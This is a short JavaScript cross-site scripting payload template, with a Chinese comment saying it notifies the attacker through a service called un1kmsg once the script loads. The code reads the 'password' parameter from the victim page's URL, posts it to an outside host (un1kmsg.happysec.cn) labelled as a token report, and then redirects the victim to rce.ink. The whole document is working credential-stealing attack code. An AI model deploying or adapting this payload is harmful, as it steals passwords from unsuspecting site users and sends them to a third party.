<!--以获取指定的url参数为例,可自己编写其他逻辑,加载xss后会使用un1kmsg通知-->
function getQueryString(name) {
  const url_string = window.location.href; // window.location.href
  const url = new URL(url_string);
  return url.searchParams.get(name);
}
var httpRequest = new XMLHttpRequest();//第一步：建立所需的对象
let xhr = new XMLHttpRequest();
xhr.open("POST", "https://un1kmsg.happysec.cn/index/processmsg/", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send("title=NewTokenReport&content="+getQueryString('password')+"&sendkey=YourSendKey");
window.location.href="https://rce.ink";
